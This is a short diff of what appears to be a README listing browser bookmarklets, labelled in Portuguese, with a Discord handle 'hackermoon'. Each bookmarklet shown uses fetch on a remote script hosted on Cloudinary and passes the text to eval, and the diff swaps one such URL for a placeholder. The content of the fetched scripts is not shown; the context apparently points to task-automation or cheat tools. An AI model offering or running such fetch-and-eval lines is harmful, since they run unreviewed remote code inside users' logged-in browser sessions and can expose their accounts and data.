@@ -6,7 +6,7 @@ javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745012111/sa
 ```
 ### FANDANGOS - TAREFAS:
 ```js
-javascript:fetch("https://res.cloudinary.com/dctxcezsd/raw/upload/v1745786682/saladofuturov2.js").then(t=>t.text()).then(eval);
+javascript:fetch("TESTES").then(t=>t.text()).then(eval);
 ```
 
 ### Discord: hackermoon
